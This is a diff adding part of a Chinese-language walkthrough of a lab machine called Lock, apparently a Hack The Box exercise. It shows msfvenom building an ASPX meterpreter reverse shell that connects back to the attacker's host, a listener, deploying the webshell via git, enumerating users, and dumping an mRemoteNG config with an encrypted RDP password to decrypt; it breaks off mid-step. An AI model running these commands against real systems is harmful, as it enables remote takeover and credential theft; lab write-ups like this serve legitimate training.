@@ -207,3 +207,113 @@ To http://10.129.35.179:3000/ellen.freeman/website.git
 [★]$ curl http://10.129.35.179/test.html
 <hl>test</hl>
 ```
+## Foothold 据点
+#### 由于从Nmap扫描中识别出Microsoft IIS被用作web服务器，因此我们可以上传一个 .aspx webshell实现远程代码执行。我们可以使用msfvenom生成这个webshell。
+```
+## 生成一个 Windows x64 的 ASPX 反弹 Shell 页面，当它在 IIS 上被访问时，会主动连回10.10.14.190:4455
+
+[★]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.190 LPORT=4455 -f aspx > rev.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of aspx file: 3683 bytes
+
+
+//真正的 Meterpreter shellcode 大小是 510 字节
+//加上 ASPX 模板、.NET 包装后 最终生成的 rev.aspx 文件大小是 3683 字节
+```
+#### 然后，我们继续使用msfconsole启动一个侦听器，以便在webshell启动时捕获反向shell触发。
+```
+[★]$ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.190; set LPORT 4455; run"
+[*] Using configured payload generic/shell_reverse_tcp  ← 启动瞬间的默认值
+PAYLOAD => windows/x64/meterpreter/reverse_tcp          ← 后面成功覆盖了
+LHOST => 10.10.14.190
+LPORT => 4455
+[*] Started reverse TCP handler on 10.10.14.190:4455    ← 真正生效的监听
+```
+#### payload 就是 meterpreter
+#### 然后再次使用git将文件推送到服务器。
+```
+[★]$ git config --global user.name "ellen.freeman"
+[★]$ git config --global user.email "ellen.freeman"
+[★]$ git add rev.aspx
+[★]$ git commit -m "reverse shell"
+[main f58bac7] reverse shell
+ 1 file changed, 47 insertions(+)
+ create mode 100644 rev.aspx
+[★]$ git push 
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 687 bytes | 687.00 KiB/s, done.
+Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://10.129.35.179:3000/ellen.freeman/website.git
+   1451575..f58bac7  main -> main
+
+[★]$ curl http://10.129.35.179/rev.aspx
+```
+#### 在提交并推送rev.aspx文件后，它会自动部署到网站上，我们触发它使用curl请求。
+```
+![图片](image/121403.png)
+```
+#### 我们确认Meterpreter会话在用户ellen.freeman下运行。
+```
+(Meterpreter 1)(c:\windows\system32\inetsrv) > getuid
+Server username: LOCK\ellen.freeman
+```
+#### 接下来，我们枚举系统上的用户帐户。
+```
+(Meterpreter 1)(c:\windows\system32\inetsrv) > shell
+Process 2244 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.20348.3932]
+(c) Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>net user
+net user
+
+User accounts for \\LOCK
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           ellen.freeman            
+gale.dekarios            Guest                    WDAGUtilityAccount       
+The command completed successfully.
+
+
+c:\windows\system32\inetsrv>
+```
+#### 这显示了另一个用户gale.dekarios。
+#### 在ellen.freeman的文档目录中，我们发现了一个文件名为config.xml。
+```
+c:\Users\ellen.freeman\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8592-A9D9
+
+ Directory of c:\Users\ellen.freeman\Documents
+
+12/28/2023  05:59 AM    <DIR>          .
+12/28/2023  11:36 AM    <DIR>          ..
+12/28/2023  05:59 AM             3,341 config.xml
+               1 File(s)          3,341 bytes
+               2 Dir(s)   5,680,271,360 bytes free
+```
+```
+c:\Users\ellen.freeman\Documents>type config.xml
+type config.xml
+<?xml version="1.0" encoding="utf-8"?>
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
+    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389"
+<SNIP>
+</mrng:Connections>
+```
+#### 这是一个远程桌面管理应用程序mRemoteNG的配置文件。该文件包括为Gale保存RDP会话。Dekarios。虽然密码是加密的，但mRemoteNG使用已知的AES-GCM加密方案，如果受保护的主密钥可用，则密码可以解密。来解密密码时，我们使用公开可用的Python脚本。
+https://raw.githubusercontent.com/gquere/mRemoteNG_password_decrypt/refs/heads/master/mremoteng_decrypt.py
+```
+[★]$ wget https://raw.githubusercontent.com/gquere/mRemoteNG_password_decrypt/refs/heads/master/mremoteng_decrypt.py
+```
+#### 把config.xml传送到本地
